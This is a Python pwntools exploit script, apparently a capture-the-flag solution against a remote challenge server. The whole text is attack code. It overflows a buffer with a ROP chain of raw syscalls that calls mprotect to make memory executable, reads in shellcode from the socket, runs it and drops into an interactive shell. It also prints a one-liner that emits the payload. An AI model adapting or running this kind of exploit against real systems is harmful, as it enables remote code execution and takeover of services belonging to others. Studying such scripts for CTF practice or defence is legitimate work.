from pwn import *

context(arch='x86', os='linux')

io = remote("pwn1.0ops.sjtu.cn", 10010)

pop_eax_rtn = 0x0804819c
pop_ebx_rtn = 0x0804819e
pop_ecx_rtn = 0x080481a0
pop_edx_rtn = 0x080481a2
int_80h_rtn = 0x080480f6

write_addr = 0x08048200

start_addr = 0x08048000
length = 0x1000
rwx = 0b111

rep = 48

sh = asm(shellcraft.sh())

payload = b''.join([ b'A'*rep,
    p32(pop_eax_rtn),
    p32(0x7d),
    p32(pop_ebx_rtn),
    p32(start_addr),
    p32(pop_ecx_rtn),
    p32(length),
    p32(pop_edx_rtn),
    p32(rwx),
    p32(int_80h_rtn), # mprotect(0x08048000, 0x1000, 7)
    p32(pop_eax_rtn),
    p32(3),
    p32(pop_ebx_rtn),
    p32(0),
    p32(pop_ecx_rtn),
    p32(write_addr),
    p32(pop_edx_rtn),
    p32(len(sh)),
    p32(int_80h_rtn), # read(0, 0x08048200, len(shellcode))
    p32(write_addr),
    p32(0)
])

print(
    f"python3 -c \"import sys; sys.stdout.buffer.write({payload})\""
)

io.send(payload)

io.sendline(sh)

io.interactive()